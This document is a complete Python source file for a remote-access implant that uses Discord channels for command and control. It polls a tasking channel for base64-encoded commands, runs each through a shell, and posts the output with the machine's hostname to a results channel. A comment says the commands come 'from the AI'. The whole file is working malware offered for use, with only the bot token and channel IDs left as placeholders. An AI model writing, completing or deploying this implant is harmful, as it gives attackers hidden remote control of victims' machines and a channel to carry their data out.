import requests
import time
import subprocess
import base64
import os

# --- CONFIGURE THESE ---
DISCORD_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"
TASKING_CHANNEL_ID = "YOUR_TASKING_CHANNEL_ID_HERE"
RESULTS_CHANNEL_ID = "YOUR_RESULTS_CHANNEL_ID_HERE"
# -----------------------

DISCORD_API_URL = "https://discord.com/api/v10"
HEADERS = {
    "Authorization": f"Bot {DISCORD_BOT_TOKEN}",
    "Content-Type": "application/json"
}

# This stores the ID of the last command we ran
LAST_MESSAGE_ID = None 

def get_task():
    """
    Polls the #tasking channel for a new command.
    """
    global LAST_MESSAGE_ID
    url = f"{DISCORD_API_URL}/channels/{TASKING_CHANNEL_ID}/messages?limit=1"

    try:
        response = requests.get(url, headers=HEADERS, timeout=10)
        response.raise_for_status()
        messages = response.json()

        if messages:
            message_id = messages[0]['id']
            message_content = messages[0]['content']

            # Check if this is a new message
            if message_id != LAST_MESSAGE_ID:
                print(f"[+] New task received: {message_content}")
                LAST_MESSAGE_ID = message_id
                return message_content

    except requests.exceptions.RequestException as e:
        print(f"[!] Implant error checking for task: {e}")

    return None

def run_command(payload):
    """
    Decodes the base64 payload and executes it.
    """
    try:
        # Decode the base64 payload from the AI
        command = base64.b64decode(payload).decode('utf-8')
        print(f"[+] Executing decoded command: {command}")

        # Run the command in the shell
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
        output = result.stdout + result.stderr

        if not output:
            output = "[+] Command executed with no output."

        return output

    except Exception as e:
        print(f"[!] Implant error executing command: {e}")
        return f"Error executing command: {e}"

def post_results(output):
    """
    Posts the command output to the #results channel.
    """
    url = f"{DISCORD_API_URL}/channels/{RESULTS_CHANNEL_ID}/messages"

    # Add a hostname for easy tracking
    hostname = os.uname().nodename
    formatted_output = f"--- Result from {hostname} ---\n```{output}```"

    # Keep output under Discord's 2000 char limit
    data = {"content": formatted_output[:1990]}

    try:
        response = requests.post(url, headers=HEADERS, json=data)
        response.raise_for_status()
        print("[+] Results posted back to C2 channel.")
    except requests.exceptions.RequestException as e:
        print(f"[!] Implant error posting results: {e}")

# --- Main Implant Loop ---
print("--- C2 Implant Running ---")
print("--- Polling for commands... ---")
while True:
    task = get_task()

    if task:
        # 1. Run the command
        result_output = run_command(task)

        # 2. Post results back
        post_results(result_output)

    # Poll every 15 seconds
    time.sleep(15)
